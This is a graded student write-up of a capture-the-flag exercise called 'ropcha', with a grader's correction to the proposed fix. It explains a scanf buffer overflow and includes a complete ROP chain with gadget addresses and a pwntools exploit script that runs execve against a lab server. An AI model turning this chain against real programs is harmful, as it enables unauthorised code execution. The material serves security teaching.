**Name:** DukDev 

**Points:** 0.9 of 1 Points

**Notes:** Solution should be scanf('%15[^\n]s'). 15 instead of 16. scanf adds the 16th byte (a terminating null-byte).

<hr>

ropcha
======

Overview
--------
The program asks for the users name and nickname. After that the user gets tasked with solving 1000000 captchas in 5 seconds. If the user succeeds, the flag gets printed.

Vulnerability
-------------
The vulnerability in the code is the question for the users name. It is a "scanf" with no restriction on the size of the users input, thus making a buffer overflow possible.

```c
void
welcome_banner_real(void) {
        char name[NAME_LENGTH];

        printf(msg_nickname);
        fflush(stdout);
        scanf("%[^\n]s", name);
        getchar();

        printf(msg_banner, name, NUM_CAPTCHA, MAX_TIME);
}

```

Exploitation
------------
First, I tried if a Buffer Overflow is possible. It is. Then I tried to figure out a way to make the program execute "getflag" (the program that prints out the flag). In the notes for the challenge I read about "execve", a syscall used to execute a program. In the complementary resources I read about "int 0x80", an interrupt signal, which can be used to execute execve.  

This works as follows:  
"int 0x80" calls the syscall specified in the register eax. Every syscall has a specific number (depending on architecture). In our case, the syscall "execve" has the number 0x0b = 11.
"execve" executes the program specified in the memory pointed to by ebx, meaning, if at the memory of ebx the string "getflag" is saved, "execve" will call "getflag". The other parameters of "execve" are in ecx and edx. For our purposes it is sufficient to fill those parameters with NULL.   

So, the final call needs to be "int_0x80" with 0x0b saved in eax and "getflag" saved at the memory pointed to by ebx.

So a step-by-step plan would be:    


1.  Write "getflag" into a writable memory region   
2.  Write 0x0b into eax, and the address of "getflag" into ebx and execute "int 0x80"     

To do all this, a ropchain is needed.

I used

```bash
ROPgadget --binary ropcha

```
to get all the gadgets found in "ropcha".

The gadgets I used are:

```
pop edx ; ret = 0x0806eabb
pop eax ; ret = 0x080bd696
mov DWORD PTR [edx], eax  ; ret = 0x08057795
xor eax, eax ; ret = 0x08056d50
pop ebx ; ret = 0x080481d1
mov edx, 0xffffffff = 0x08056e05
inc edx ; ret = 0x0805f7e7
xor ecx, ecx ; int_x80 = 0x0806ee81

```

1. Write "getflag" into a writable memory region  

   I got the memory region with

   ```bash
   cat /proc/{pid_of_ropcha}/maps
   ```
   In my case, i used "0x080ef000" as address for "getflag".

   Following steps/input values are needed to write "getflag" into that address:
   - 0x0806eabb: pop edx ; ret
   - 0x080ef000: the address for "getflag"
   - 0x080bd696: pop eax ; ret
   - "getf": first 4 bytes of "getflag"
   - 0x08057795: mov DWORD PTR [edx], eax  ; ret
   - 0x0806eabb: pop edx ; ret
   - 0x080ef000 + 4: address for the rest of "getflag"
   - 0x080bd696: pop eax ; ret
   - "lagg": "lagg" because I need 4 bytes.
   - 0x08057795: mov DWORD PTR [edx], eax  ; ret
   - 0x0806eabb: pop edx ; ret
   - 0x080ef000 + 7: address for the nullbyte for "getflag". Sets the last "g" to a nullbyte
   - 0x08056d50: xor eax, eax ; ret: Set eax to 0
   - 0x08057795: mov DWORD PTR [edx], eax  ; ret

   Now "getflag" is written into the address at 0x080ef000 and terminated with a nullbyte.


2. Write 0x0b into eax, and the address of "getflag" into ebx and execute "int 0x80"  

   - 0x080bd696: pop eax ; ret
   - 0x0b: 11 in hex, the code for "execve"
   - 0x080481d1: pop ebx ; ret
   - 0x080ef000: the address where "getflag" is stored.
   - 0x08056e05: mov edx, 0xffffffff: sets edx to the highest possible value
   - 0x0805f7e7: inc edx ; ret: increment edx by 1, thus setting it to 0
   - 0x0806ee81: xor ecx, ecx ; int_x80: setting ecx to 0, and executing "int 0x80"

   Now the registers are filled with the right values and "int 0x80" gets executed, which calls "execve", which calls "getflag" and the flag is printed.

My Code:

```python
#!/usr/bin/python3

import sys
from pwn import *

def main():
    #writable_reg = 0x080ef000

    padding = b'A' * 28
    #gadgets
    pop_edx = p32(0x0806eabb)
    pop_eax = p32(0x080bd696)
    mov_ptr_edx_eax = p32(0x08057795)
    xor_eax = p32(0x08056d50)
    pop_ebx = p32(0x080481d1)
    mov_edx_ff = p32(0x08056e05)
    inc_edx = p32(0x0805f7e7)
    xor_ecx_int_x80 = p32(0x0806ee81)

    payload = padding + pop_edx + p32(0x080ef000)  + pop_eax + b"getf" + mov_ptr_edx_eax + pop_edx + p32(0x080ef000 + 4) + pop_eax + b"lagg" + mov_ptr_edx_eax + pop_edx + p32(0x080ef000 + 7) + xor_eax + mov_ptr_edx_eax + pop_eax + p32(0x0b) + pop_ebx + p32(0x080ef000) + mov_edx_ff + inc_edx + xor_ecx_int_x80

    p = remote("10.3.0.5", 31337)
    #pd = gdb.attach(p)
    print(p.recvuntil("? "))
    p.sendline(payload)
    p.interactive()



if __name__ == '__main__':
    main()

```

Solution
--------
I would use the size field in scanf to set a size limit to the users input:

```c
scanf("%16[^\n]s", name);

```

The "16" limits the input to 16 characters. I used 16 because NAME_LENGTH = 16.
With this, in all occurrences of scanf, a buffer overflow is not possible.
